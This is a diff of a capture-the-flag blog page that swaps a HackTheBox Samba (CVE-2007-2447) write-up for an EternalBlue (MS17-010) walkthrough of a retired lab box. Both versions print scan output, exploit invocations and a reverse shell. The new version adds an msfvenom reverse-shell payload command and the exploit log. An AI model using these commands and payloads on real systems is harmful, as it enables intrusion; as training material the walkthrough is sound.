@@ -79,7 +79,7 @@
 <link href="/assets/css/main.css?v=1.0" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="linux,samba,CVE-2007-2447,without metasploit," />
+  <meta name="keywords" content="Windows,EternalBlue,MS17-010,without metasploit," />
 
 
 
@@ -105,21 +105,21 @@
 
 
 
-<meta name="description" content="A retired linux box from HackTheBox, owned by exploiting the known vulnerability on the installed Samba version.">
-<meta name="keywords" content="linux, samba, CVE-2007-2447, without metasploit">
+<meta name="description" content="A retired windows box from HackTheBox, vulnerable to EternalBlue (MS17-010), exploited manually and gained SYSTEM access.">
+<meta name="keywords" content="Windows, EternalBlue, MS17-010, without metasploit">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Lame Machine Writeup- HackTheBox">
-<meta property="og:url" content="http://localhost:4000/2020/12/02/HTB_Lame_Writeup/">
+<meta property="og:title" content="Blue Machine Writeup- HackTheBox">
+<meta property="og:url" content="http://localhost:4000/2020/12/09/HTB_Blue_Writeup/">
 <meta property="og:site_name" content="b4bygroot">
-<meta property="og:description" content="A retired linux box from HackTheBox, owned by exploiting the known vulnerability on the installed Samba version.">
+<meta property="og:description" content="A retired windows box from HackTheBox, vulnerable to EternalBlue (MS17-010), exploited manually and gained SYSTEM access.">
 <meta property="og:locale" content="en">
-<meta property="og:image" content="/assets/images/Lame/info.png">
-<meta property="og:image" content="/assets/images/Lame/rootShell.png">
-<meta property="og:image" content="/assets/images/Lame/machineOwn.png">
+<meta property="og:image" content="/assets/images/Blue/info.png">
+<meta property="og:image" content="/assets/images/Blue/shell.png">
+<meta property="og:image" content="/assets/images/Blue/systemown.svg">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Lame Machine Writeup- HackTheBox">
-<meta name="twitter:description" content="A retired linux box from HackTheBox, owned by exploiting the known vulnerability on the installed Samba version.">
-<meta name="twitter:image" content="/assets/images/Lame/info.png">
+<meta name="twitter:title" content="Blue Machine Writeup- HackTheBox">
+<meta name="twitter:description" content="A retired windows box from HackTheBox, vulnerable to EternalBlue (MS17-010), exploited manually and gained SYSTEM access.">
+<meta name="twitter:image" content="/assets/images/Blue/info.png">
 
 
 <script type="text/javascript" id="hexo.configurations">
@@ -152,7 +152,7 @@
 
 
 
-  <title>Lame Machine Writeup- HackTheBox | b4bygroot</title>
+  <title>Blue Machine Writeup- HackTheBox | b4bygroot</title>
   
 
 
@@ -195,7 +195,7 @@
     
 
     <div class="custom-logo-site-title">
-      <a href="/" class="brand" rel="start">
+      <a href="/"  class="brand" rel="start">
         <span class="logo-line-before"><i></i></span>
         <span class="site-title">b4bygroot</span>
         <span class="logo-line-after"><i></i></span>
@@ -227,7 +227,7 @@
         <li class="menu-item menu-item-home">
           <a href="/" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
             
             Home
           </a>
@@ -239,7 +239,7 @@
         <li class="menu-item menu-item-categories">
           <a href="/categories/" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
             
             Categories
           </a>
@@ -251,7 +251,7 @@
         <li class="menu-item menu-item-about">
           <a href="/about/" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
             
             About
           </a>
@@ -263,7 +263,7 @@
         <li class="menu-item menu-item-archives">
           <a href="/archives/" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
             
             Archives
           </a>
@@ -275,7 +275,7 @@
         <li class="menu-item menu-item-tags">
           <a href="/tags/" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
             
             Tags
           </a>
@@ -288,7 +288,7 @@
             <a href="javascript:;" class="popup-trigger">
           
             
-              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
             
             Search
           </a>
@@ -309,7 +309,9 @@
       <i class="fa fa-times-circle"></i>
     </span>
     <div class="local-search-input-wrapper">
-      <input autocomplete="off" placeholder="Searching..." spellcheck="false" type="text" id="local-search-input">
+      <input autocomplete="off"
+             placeholder="Searching..." spellcheck="false"
+             type="text" id="local-search-input">
     </div>
   </div>
   <div id="local-search-result"></div>
@@ -343,7 +345,7 @@
   
 
   <article class="post post-type- " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://localhost:4000/2020/12/02/HTB_Lame_Writeup/">
+    <link itemprop="mainEntityOfPage" href="http://localhost:4000/2020/12/09/HTB_Blue_Writeup/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="b4bygroot">
@@ -363,7 +365,7 @@
           <h2 class="post-title" itemprop="name headline">
           
           
-            Lame Machine Writeup- HackTheBox
+            Blue Machine Writeup- HackTheBox
           
         </h2>
         
@@ -377,8 +379,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-12-02T16:00:00+05:30">
-                2020-12-02
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-12-09T16:00:00+05:30">
+                2020-12-09
               </time>
             
 
@@ -388,7 +390,7 @@
           </span>
 
           
-            <span class="post-category">
+            <span class="post-category" >
             
               <span class="post-meta-divider">|</span>
             
@@ -466,210 +468,252 @@
 
       
         
-  <p><img src="/assets/images/Lame/info.png" alt="Info"></p>
+  <p><img src="/assets/images/Blue/info.png" alt="Info" /></p>
 
 <h1 id="methodology">Methodology</h1>
 <ol>
   <li>Open Ports Enumeration</li>
-  <li>Samba version identified</li>
-  <li>RCE for Samba version identified</li>
-  <li>Foothold gained as root user</li>
+  <li>SMB Service Enumeration</li>
+  <li>MS17-010 vulnerability identified</li>
+  <li>SYSTEM shell gained through manual exploit</li>
 </ol>
 
 <h1 id="lessons-learned">Lessons Learned</h1>
 <ol>
-  <li>Public Exploit Identification</li>
+  <li>EternalBlue exploit</li>
+  <li>Manual exploitation of MS17-010</li>
 </ol>
 
 <h1 id="open-ports-enumeration">Open Ports Enumeration</h1>
-<p>The open ports enumeration through targetRecon<sup id="fnref:footnote" role="doc-noteref"><a href="#fn:footnote" class="footnote">1</a></sup> had identified four open ports namely <strong>FTP</strong> (21), <strong>SSH</strong> (22),
-<strong>NETBIOS-SSN</strong> (139) and <strong>MICROSOFT-DS</strong> (445). The scan had not identified any known vulnerabilities through 
-vulnerability scan. The results of the scan are given below.</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>b4bygroot@arcolinux:~/HTB/Tracks/Beginner_Track/Lame|
-⇒  targetRecon 10.10.10.3
+<p>The open ports enumeration through targetRecon<sup id="fnref:fn1" role="doc-noteref"><a href="#fn:fn1" class="footnote">1</a></sup>, had identified three open ports namely, <strong>MSRPC</strong> (135),
+<strong>NETBIOS-SSN</strong> (139) and <strong>MICROSOFT-DS</strong> (445). The results of the scan are given below.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[b4bygroot☮arcolinux]-(~/HTB/Tracks/Beginner/Blue)
+└&gt; targetRecon 10.10.10.40
 [+] Open Ports Scan
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
-		21      ftp
-		22      ssh
+		135     msrpc
 		139     netbios-ssn
 		445     microsoft-ds
 [+] Scripts Scan
-				 nmap -sV -A --script=default,vuln -p 21 10.10.10.3
+				 nmap -sV -A --script=default,vuln -p 135 10.10.10.40
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
 
-Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-02 13:38 IST
-Nmap scan report for 10.10.10.3 (10.10.10.3)
-Host is up (0.20s latency).
+Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-09 16:50 IST
+Nmap scan report for 10.10.10.40 (10.10.10.40)
+Host is up (0.21s latency).
 
-PORT   STATE SERVICE VERSION
-21/tcp open  ftp     vsftpd 2.3.4
-|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
-| ftp-syst: 
-|   STAT: 
-| FTP server status:
-|      Connected to 10.10.14.3
-|      Logged in as ftp
-|      TYPE: ASCII
-|      No session bandwidth limit
-|      Session timeout in seconds is 300
-|      Control connection is plain text
-|      Data connections will be plain text
-|      vsFTPd 2.3.4 - secure, fast, stable
-|_End of status
-|_sslv2-drown: 
-Service Info: OS: Unix
+PORT    STATE SERVICE VERSION
+135/tcp open  msrpc   Microsoft Windows RPC
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 34.46 seconds
+Nmap done: 1 IP address (1 host up) scanned in 22.21 seconds
 
-				 nmap -sV -A --script=default,vuln -p 22 10.10.10.3
+				 nmap -sV -A --script=default,vuln -p 139 10.10.10.40
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
 
-Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-02 13:38 IST
-Nmap scan report for 10.10.10.3 (10.10.10.3)
-Host is up (0.22s latency).
-
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
-| ssh-hostkey: 
-|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
-|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
-| vulners: 
-|   cpe:/a:openbsd:openssh:4.7p1: 
-|       PACKETSTORM:101052      7.8     https://vulners.com/packetstorm/PACKETSTORM:101052      *EXPLOIT*
-|       CVE-2010-4478   7.5     https://vulners.com/cve/CVE-2010-4478
-|       CVE-2008-1657   6.5     https://vulners.com/cve/CVE-2008-1657
-|       SSV:60656       5.0     https://vulners.com/seebug/SSV:60656    *EXPLOIT*
-|       CVE-2017-15906  5.0     https://vulners.com/cve/CVE-2017-15906
-|       CVE-2010-5107   5.0     https://vulners.com/cve/CVE-2010-5107
-|       CVE-2010-4755   4.0     https://vulners.com/cve/CVE-2010-4755
-|       CVE-2012-0814   3.5     https://vulners.com/cve/CVE-2012-0814
-|       CVE-2011-5000   3.5     https://vulners.com/cve/CVE-2011-5000
-|       CVE-2011-4327   2.1     https://vulners.com/cve/CVE-2011-4327
-|_      CVE-2008-3259   1.2     https://vulners.com/cve/CVE-2008-3259
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 18.15 seconds
-
-				 nmap -sV -A --script=default,vuln -p 139 10.10.10.3
-Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
-
-Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-02 13:39 IST
-Nmap scan report for 10.10.10.3 (10.10.10.3)
+Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-09 16:50 IST
+Nmap scan report for 10.10.10.40 (10.10.10.40)
 Host is up (0.20s latency).
 
 PORT    STATE SERVICE     VERSION
-139/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
+139/tcp open  netbios-ssn Microsoft Windows netbios-ssn
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 
 Host script results:
-|_clock-skew: mean: 2h39m33s, deviation: 3h33m46s, median: 8m23s
+|_samba-vuln-cve-2012-1182: SMB: Couldn't find a NetBIOS name that works for the server. Sorry!
+|_smb-vuln-ms10-054: false
+|_smb-vuln-ms10-061: SMB: Couldn't find a NetBIOS name that works for the server. Sorry!
+|_smb2-security-mode: SMB: Couldn't find a NetBIOS name that works for the server. Sorry!
+|_smb2-time: ERROR: Script execution failed (use -d to debug)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 56.36 seconds
+
+				 nmap -sV -A --script=default,vuln -p 445 10.10.10.40
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+
+Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-09 16:51 IST
+Nmap scan report for 10.10.10.40 (10.10.10.40)
+Host is up (0.20s latency).
+
+PORT    STATE SERVICE      VERSION
+445/tcp open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
+Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 8m10s, deviation: 4s, median: 8m07s
 | smb-os-discovery: 
-|   OS: Unix (Samba 3.0.20-Debian)
-|   Computer name: lame
-|   NetBIOS computer name: 
-|   Domain name: hackthebox.gr
-|   FQDN: lame.hackthebox.gr
-|_  System time: 2020-12-02T03:20:12-05:00
+|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
+|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
+|   Computer name: haris-PC
+|   NetBIOS computer name: HARIS-PC\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2020-12-09T11:30:26+00:00
 | smb-security-mode: 
-|   account_used: &lt;blank&gt;
+|   account_used: guest
 |   authentication_level: user
 |   challenge_response: supported
 |_  message_signing: disabled (dangerous, but default)
 |_smb-vuln-ms10-054: false
-|_smb-vuln-ms10-061: false
-|_smb-vuln-regsvc-dos: ERROR: Script execution failed (use -d to debug)
-|_smb2-time: Protocol negotiation failed (SMB2)
+|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND
+| smb-vuln-ms17-010: 
+|   VULNERABLE:
+|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143
+|     Risk factor: HIGH
+|       A critical remote code execution vulnerability exists in Microsoft SMBv1
+|        servers (ms17-010).
+|           
+|     Disclosure date: 2017-03-14
+|     References:
+|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
+|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2020-12-09T11:30:24
+|_  start_date: 2020-12-09T11:21:10
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 425.45 seconds
-
-				 nmap -sV -A --script=default,vuln -p 445 10.10.10.3
-Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
-
-Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-02 13:46 IST
-Nmap scan report for 10.10.10.3 (10.10.10.3)
-Host is up (0.20s latency).
-
-PORT    STATE SERVICE     VERSION
-445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
-
-Host script results:
-|_clock-skew: mean: 2h38m28s, deviation: 3h32m14s, median: 8m23s
-| smb-os-discovery: 
-|   OS: Unix (Samba 3.0.20-Debian)
-|   Computer name: lame
-|   NetBIOS computer name: 
-|   Domain name: hackthebox.gr
-|   FQDN: lame.hackthebox.gr
-|_  System time: 2020-12-02T03:25:02-05:00
-| smb-security-mode: 
-|   account_used: &lt;blank&gt;
-|   authentication_level: user
-|   challenge_response: supported
-|_  message_signing: disabled (dangerous, but default)
-|_smb-vuln-ms10-054: false
-|_smb-vuln-ms10-061: false
-|_smb-vuln-regsvc-dos: ERROR: Script execution failed (use -d to debug)
-|_smb2-time: Protocol negotiation failed (SMB2)
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 172.54 seconds
+Nmap done: 1 IP address (1 host up) scanned in 48.89 seconds
 
 [+] Summary 
-21      ftp     vsftpd 2.3.4
+135     msrpc   Microsoft Windows RPC N/A
 				No vuln found
-22      ssh     OpenSSH 4.7p1 Debian 8ubuntu1
+139     netbios-ssn     Microsoft Windows netbios-ssn N/A
 				No vuln found
-139     netbios-ssn     Samba smbd 3.0.20-Debian
-				No vuln found
-445     microsoft-ds    Samba smbd 3.0.20-Debian
-				No vuln found
+445     microsoft-ds    Windows 7 Professional 7601 Service Pack 1 microsoft-ds N/A
+Vulnerabilities
+['smb-vuln-ms17-010']
 </code></pre></div></div>
 
-<h1 id="samba-service-enumeration">Samba Service Enumeration</h1>
-<p>Through the scan result from the previous section the <strong>Samba</strong> service version of the target was identified as 
-<strong><em>3.0.20</em></strong>. Google-Fu with the version had identified a known vulnerability through <strong><em>CVE-2007-2447</em></strong>. Though
-metasploit module is available for the vulnerability, further googling had identified a working python exploit on GitHub
-by <strong>amriunix</strong><sup id="fnref:footnote2" role="doc-noteref"><a href="#fn:footnote2" class="footnote">2</a></sup>.</p>
+<h1 id="smb-service-enumeration">SMB Service Enumeration</h1>
+<p>As seen from the results on the previous section, the SMB service on the target is vulnerable to 
+<strong>EternalBlue (MS17-010)</strong>. There is a well written, functioning module on <em>metasploit</em> that could work. Since the 
+focus is on owning the target without metasploit, <em>Google-Fu</em> on manual exploitation methods were carried out.</p>
 
 <h1 id="foothold">Foothold</h1>
-<p>Before executing the exploit, the required package <strong><em>pysmb</em></strong> needed to be installed through <em>pip</em>. 
-A <em>netcat</em> listener, listening on port <strong>9095</strong> was initiated after which the exploit script was executed as follows.</p>
-<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>b4bygroot@arcolinux Lame <span class="o">]</span><span class="nv">$ </span>python usermapScript.py 10.10.10.3 445 10.10.14.3 9095
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> CVE-2007-2447 - Samba usermap script
-<span class="o">[</span>+] Connecting <span class="o">!</span>
-<span class="o">[</span>+] Payload was sent - check netcat <span class="o">!</span>
+<p>Google search had listed numerous good resources on how to exploit EternalBlue manually. An interesting article from the 
+lot, <strong>Exploiting MS17-010 without Metasploit (Win XP SP3)</strong><sup id="fnref:fn2" role="doc-noteref"><a href="#fn:fn2" class="footnote">2</a></sup>, was chosen for this target. It involves using 
+<strong>send_and_execute.py</strong><sup id="fnref:fn3" role="doc-noteref"><a href="#fn:fn3" class="footnote">3</a></sup> with its dependencies <strong>Impacket</strong><sup id="fnref:fn4" role="doc-noteref"><a href="#fn:fn4" class="footnote">4</a></sup> and <strong>mysmb</strong><sup id="fnref:fn5" role="doc-noteref"><a href="#fn:fn5" class="footnote">5</a></sup> installed.</p>
+
+<blockquote>
+  <p>Note: While, impacket can be installed directly through <em>pip</em>, <em>mysmb</em> had to be downloaded manually. There are
+numerous mysmb options available on GitHub, one such instance used to exploit the machine is listed on <sup id="fnref:fn5:1" role="doc-noteref"><a href="#fn:fn5" class="footnote">5</a></sup>.
+The exploits from <strong>Exploit-DB</strong> would also work, but need some similar customization as send_and_execute.py</p>
+</blockquote>
+
+<p>After downloading send_and_execute.py and installing necessary dependencies, the exploit was browsed through to 
+understand the process. The exploit works by uploading a user-specified <strong>payload</strong> onto the target using <em>PIPE</em> and
+executing it. A payload was then generated using <em>msfvenom</em> through the command, 
+<code class="language-plaintext highlighter-rouge">msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.7 LPORT=9095 EXITFUNC=thread -f exe -a x86 --platform windows -o ms17-010.exe</code>.
+With the payload generated, and a netcat listener on port 9095 of the attacking host, the script was executed as
+<code class="language-plaintext highlighter-rouge">python2.7 send_and_execute.py 10.10.10.40 ms17-010.exe</code>, resulting in a failed attempt with the message
+<em>“Not found accessible named pipe”</em>. After researching further, trying the exploit again with a different username
+seemed a reasonable option. The <em>USERNAME</em> on the python script was changed to <strong>guest</strong> as shown in the section below.</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">USERNAME</span> <span class="o">=</span> <span class="s">'guest'</span>
+<span class="n">PASSWORD</span> <span class="o">=</span> <span class="s">''</span>
 </code></pre></div></div>
-<p>This resulted in a reverse shell on the netcat listener. Enumerating further had showed that the shell received was from
-the <strong>root</strong> user, eliminating the need for privilege escalation. The same is shown on the section below.</p>
-<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  Lame  nc <span class="nt">-nvlp</span> 9095                                         
-Connection from 10.10.10.3:52271
-python <span class="nt">-c</span> <span class="s2">"import pty;pty.spawn('/bin/bash')"</span>
-root@lame:/# <span class="nb">id
-id
-</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
-root@lame:/# <span class="nb">cat</span> /root/root.txt
-<span class="nb">cat</span> /root/root.txt
-0a4e1bf944cdc7df8c2f1eb56bf8030d
-root@lame:/# <span class="nb">cat</span> /home/makis/user.txt
-<span class="nb">cat</span> /home/makis/user.txt
-a392eccf53d48a4abf840247bd155f80
-root@lame:/# 
+<p>The script was executed again after initiating a netcat listener on the attacking host. This time the exploit worked,
+resulting in a reverse shell from the target and the same is shown on the section given below.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[-----TERMINAL-1-----]
+Beginner/Blue [ python2.7 send_and_execute.py 10.10.10.40 ms17-010.exe                     ] 8:01 PM
+Trying to connect to 10.10.10.40:445
+Target OS: Windows 7 Professional 7601 Service Pack 1
+Using named pipe: browser
+Target is 64 bit
+Got frag size: 0x10
+GROOM_POOL_SIZE: 0x5030
+BRIDE_TRANS_SIZE: 0xfa0
+CONNECTION: 0xfffffa800482c020
+SESSION: 0xfffff8a001885060
+FLINK: 0xfffff8a00187f048
+InParam: 0xfffff8a0019a215c
+MID: 0x1302
+unexpected alignment, diff: 0x-123fb8
+leak failed... try again
+CONNECTION: 0xfffffa800482c020
+SESSION: 0xfffff8a001885060
+FLINK: 0xfffff8a0019b4088
+InParam: 0xfffff8a0019ae15c
+MID: 0x1303
+success controlling groom transaction
+modify trans1 struct for arbitrary read/write
+make this SMB session to be SYSTEM
+overwriting session security context
+Sending file 2CM2VQ.exe...
+Opening SVCManager on 10.10.10.40.....
+Creating service vWCH.....
+Starting service vWCH.....
+The NETBIOS connection with the remote host timed out.
+Removing service vWCH.....
+ServiceExec Error on: 10.10.10.40
+nca_s_proto_error
+Done
+
+[-----TERMINAL-2-----]
+➜  Blue  nc -nvlp 9095                                         
+Connection from 10.10.10.40:49158
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32&gt;cd C:\Users\Administrator\Desktop
+cd C:\Users\Administrator\Desktop
+
+C:\Users\Administrator\Desktop&gt;type root.txt
+type root.txt
+ff548eb71e920ff6c08843ce9df4e717
+C:\Users\Administrator\Desktop&gt;cd C:\Users
+cd C:\Users
+
+C:\Users&gt;dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is A0EF-1911
+
+ Directory of C:\Users
+
+21/07/2017  06:56    &lt;DIR&gt;          .
+21/07/2017  06:56    &lt;DIR&gt;          ..
+21/07/2017  06:56    &lt;DIR&gt;          Administrator
+14/07/2017  13:45    &lt;DIR&gt;          haris
+12/04/2011  07:51    &lt;DIR&gt;          Public
+			   0 File(s)              0 bytes
+			   5 Dir(s)  15,888,822,272 bytes free
+
+C:\Users&gt;cd haris\Desktop 
+cd haris\Desktop
+
+C:\Users\haris\Desktop&gt;type user.txt
+type user.txt
+4c546aea7dbee75cbd71de245c8deea9
 </code></pre></div></div>
-<p><img src="/assets/images/Lame/rootShell.png" alt="Root Shell"></p>
+<p><img src="/assets/images/Blue/shell.png" alt="SYSTEM Shell" /></p>
 
 <h1 id="system-owned">System Owned</h1>
-<p><img src="/assets/images/Lame/machineOwn.png" alt="System Owned"></p>
+<p><img src="/assets/images/Blue/systemown.svg" alt="System Owned" /></p>
 
 <h1 id="resources">Resources</h1>
 <div class="footnotes" role="doc-endnotes">
   <ol>
-    <li id="fn:footnote" role="doc-endnote">
-      <p><a href="https://github.com/b4bygroot/TargetRecon">targetRecon</a> <a href="#fnref:footnote" class="reversefootnote" role="doc-backlink">↩</a></p>
+    <li id="fn:fn1" role="doc-endnote">
+      <p><a href="https://github.com/b4bygroot/TargetRecon">targetRecon</a> <a href="#fnref:fn1" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
     </li>
-    <li id="fn:footnote2" role="doc-endnote">
-      <p><a href="https://github.com/amriunix/CVE-2007-2447">CVE-2007-2447 Samba usermap script</a> <a href="#fnref:footnote2" class="reversefootnote" role="doc-backlink">↩</a></p>
+    <li id="fn:fn2" role="doc-endnote">
+      <p><a href="https://ivanitlearning.wordpress.com/2019/02/24/exploiting-ms17-010-without-metasploit-win-xp-sp3/">Exploiting MS17-010 without Metasploit (Win XP SP3)</a> <a href="#fnref:fn2" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
+    </li>
+    <li id="fn:fn3" role="doc-endnote">
+      <p><a href="https://github.com/helviojunior/MS17-010/blob/master/send_and_execute.py">send_and_execute.py</a> <a href="#fnref:fn3" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
+    </li>
+    <li id="fn:fn4" role="doc-endnote">
+      <p>Impacket can be installed through <em>pip install impacket</em> <a href="#fnref:fn4" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
+    </li>
+    <li id="fn:fn5" role="doc-endnote">
+      <p><a href="https://github.com/worawit/MS17-010/blob/master/mysmb.py">mysmb.py</a> <a href="#fnref:fn5" class="reversefootnote" role="doc-backlink">&#8617;</a> <a href="#fnref:fn5:1" class="reversefootnote" role="doc-backlink">&#8617;<sup>2</sup></a></p>
     </li>
   </ol>
 </div>
@@ -704,13 +748,13 @@ root@lame:/#
         <div class="post-tags">
           
             
-            <a href="/tag/#/linux" rel="tag"># linux</a>
+            <a href="/tag/#/Windows" rel="tag"># Windows</a>
           
             
-            <a href="/tag/#/samba" rel="tag"># samba</a>
+            <a href="/tag/#/EternalBlue" rel="tag"># EternalBlue</a>
           
             
-            <a href="/tag/#/CVE-2007-2447" rel="tag"># CVE-2007-2447</a>
+            <a href="/tag/#/MS17-010" rel="tag"># MS17-010</a>
           
             
             <a href="/tag/#/without%20metasploit" rel="tag"># without metasploit</a>
@@ -729,15 +773,15 @@ root@lame:/#
         <div class="post-nav" id="post-nav-id">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2020/12/03/HTB_Jerry_Writeup/" rel="next" title="Jerry Machine Writeup- HackTheBox">
-                <i class="fa fa-chevron-left"></i> Jerry Machine Writeup- HackTheBox
-              </a>
-            
           </div>
 
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/12/08/HTB_Netmon-Writeup/" rel="prev" title="Netmon Machine Writeup- HackTheBox">
+                Netmon Machine Writeup- HackTheBox <i class="fa fa-chevron-right"></i>
+              </a>
             
           </div>
         </div>
@@ -794,7 +838,7 @@ root@lame:/#
 
       
         <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
             Table of Contents
           </li>
           <li class="sidebar-nav-overview" data-target="site-overview">
@@ -805,7 +849,9 @@ root@lame:/#
 
       <section class="site-overview sidebar-panel">
         <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-          <img class="site-author-image" itemprop="image" src="/assets/images/author.jpeg" alt="b4bygroot">
+          <img class="site-author-image" itemprop="image"
+               src="/assets/images/author.jpeg"
+               alt="b4bygroot" />
           <p class="site-author-name" itemprop="name">b4bygroot</p>
            
               <p class="site-description motion-element" itemprop="description"></p>
@@ -919,8 +965,8 @@ root@lame:/#
 
             
               <div class="post-toc-content">
-    <ol class="nav">
-      <li class="nav-item nav-level-1"> <a class="nav-link" href="#methodology"> <span class="nav-number">1</span> <span class="nav-text">Methodology</span> </a> </li> <li class="nav-item nav-level-1"> <a class="nav-link" href="#lessons-learned"> <span class="nav-number">2</span> <span class="nav-text">Lessons Learned</span> </a> </li> <li class="nav-item nav-level-1"> <a class="nav-link" href="#open-ports-enumeration"> <span class="nav-number">3</span> <span class="nav-text">Open Ports Enumeration</span> </a> </li> <li class="nav-item nav-level-1"> <a class="nav-link" href="#samba-service-enumeration"> <span class="nav-number">4</span> <span class="nav-text">Samba Service Enumeration</span> </a> </li> <li class="nav-item nav-level-1"> <a class="nav-link" href="#foothold"> <span class="nav-number">5</span> <span class="nav-text">Foothold</span> </a> </li> <li class="nav-item nav-level-1"> <a class="nav-link" href="#system-owned"> <span class="nav-number">6</span> <span class="nav-text">System Owned</span> </a> </li> <li class="nav-item nav-level-1"> <a class="nav-link" href="#resources"> <span class="nav-number">7</span> <span class="nav-text">Resources</span> </a> </li>
+    <ol class=nav>
